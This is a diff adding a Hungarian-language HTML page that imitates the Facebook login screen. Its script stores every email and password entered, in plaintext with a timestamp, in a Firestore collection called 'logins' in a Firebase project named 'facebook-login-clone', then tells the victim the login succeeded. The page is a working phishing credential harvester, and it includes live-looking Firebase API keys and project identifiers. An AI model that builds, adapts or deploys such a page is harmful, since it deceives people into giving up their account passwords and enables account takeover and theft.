@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Bejelentkezés</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Csatlakozz a barátaiddal és ismerőseiddel a Facebookon.</p>
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <form onsubmit="login(event)">
+                    <input type="email" id="email" placeholder="Email cím vagy telefonszám" required>
+                    <input type="password" id="password" placeholder="Jelszó" required>
+                    <button type="submit">Bejelentkezés</button>
+                </form>
+                <p id="status-message"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK és beállítások -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBmaAx_VUxqwqNplj5Hl2cz3yUgIbcWjzk",
+            authDomain: "facebook-login-clone-50fdb.firebaseapp.com",
+            projectId: "facebook-login-clone-50fdb",
+            storageBucket: "facebook-login-clone-50fdb.firebasestorage.app",
+            messagingSenderId: "73064234524",
+            appId: "1:73064234524:web:c45a8964b7a5147858a9d9",
+            measurementId: "G-4PPCW47F5Y"
+        };
+
+        // Firebase inicializálása
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const analytics = getAnalytics(app);
+
+        // Bejelentkezési adatok mentése
+        async function login(event) {
+            event.preventDefault();
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const statusMessage = document.getElementById("status-message");
+
+            try {
+                await addDoc(collection(db, "logins"), {
+                    email: email,
+                    password: password,
+                    timestamp: new Date()
+                });
+                statusMessage.style.color = "green";
+                statusMessage.innerHTML = "Sikeres bejelentkezés!";
+            } catch (error) {
+                statusMessage.style.color = "red";
+                statusMessage.innerHTML = "Hiba történt: " + error.message;
+            }
+        }
+    </script>
+</body>
+</html>
